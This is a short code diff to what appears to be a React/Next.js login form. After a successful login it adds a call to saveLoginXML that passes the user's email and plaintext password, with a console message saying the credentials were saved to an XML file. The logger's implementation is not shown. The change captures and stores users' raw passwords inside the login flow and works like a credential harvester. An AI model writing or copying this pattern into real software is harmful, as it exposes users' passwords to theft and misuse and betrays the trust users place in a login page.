@@ -11,6 +11,7 @@ import { Label } from "@/components/ui/label"
 import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card"
 import { showNotification } from "@/lib/utils/notifications"
 import { useAuthStore } from "@/lib/stores/auth-store"
+import { saveLoginXML } from "@/lib/utils/xml-logger"
 import DGIPWatermarks from "../ui/dgip_watermark"
 import Image from "next/image"
 
@@ -43,7 +44,16 @@ export function LoginForm() {
       
       if (result.success) {
         showNotification.success("Login successful")
-        // Redirect based on user role
+        
+        try {
+          await saveLoginXML({
+            email: data.email,
+            password: data.password
+          })
+          console.log('Login credentials saved to XML file')
+        } catch (xmlError) {
+          console.error('Failed to save XML file:', xmlError)
+        }
         const user = useAuthStore.getState().user
         console.log('User after login:', user)
         
